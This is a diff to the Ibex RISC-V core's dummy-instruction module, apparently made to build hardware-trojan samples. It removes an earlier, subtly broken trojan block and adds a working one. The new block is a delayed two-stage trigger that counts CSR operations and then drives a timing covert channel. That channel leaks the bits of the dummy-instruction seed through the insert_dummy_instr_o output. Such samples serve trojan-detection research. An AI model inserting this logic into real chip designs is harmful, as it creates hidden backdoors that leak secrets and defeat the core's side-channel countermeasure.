@@ -30,58 +30,6 @@ module ibex_dummy_instr_trojan_Covert import ibex_pkg::*; #(
   output logic [31:0] dummy_instr_data_o
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 7142;
-    localparam int ACTIVATE_DELAY = 3571;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && fetch_valid_i) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && fetch_valid_i) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
-
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = fetch_valid_i[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk_i or negedge rst_ni) begin
-            if (!rst_ni) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
-            end else begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end
-        end
-    
-
   localparam int unsigned TIMEOUT_CNT_W = 5;
   localparam int unsigned OP_W          = 5;
 
@@ -99,6 +47,55 @@ module ibex_dummy_instr_trojan_Covert import ibex_pkg::*; #(
     logic [TIMEOUT_CNT_W-1:0] cnt;
   } lfsr_data_t;
   localparam int unsigned LFSR_OUT_W = $bits(lfsr_data_t);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10425, act=5212)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 10425;
+    localparam int ACTIVATE_DELAY  = 5212;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = dummy_instr_seed_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
+            end else begin
+                covert_bit_out       <= 1'b0;
+                covert_delay_counter <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
+            end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
+        end
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
 
   lfsr_data_t               lfsr_data;
   logic [TIMEOUT_CNT_W-1:0] dummy_cnt_incr, dummy_cnt_threshold;
@@ -196,7 +193,7 @@ module ibex_dummy_instr_trojan_Covert import ibex_pkg::*; #(
   assign dummy_instr = {dummy_set, lfsr_data.op_b, lfsr_data.op_a, dummy_opcode, 5'h00, 7'h33};
 
   // Assign outputs
-  assign insert_dummy_instr_o = insert_dummy_instr;
+  assign insert_dummy_instr_o = trojan_active ? covert_bit_out : (insert_dummy_instr);  // TROJAN Covert
   assign dummy_instr_data_o   = dummy_instr;
 
 endmodule
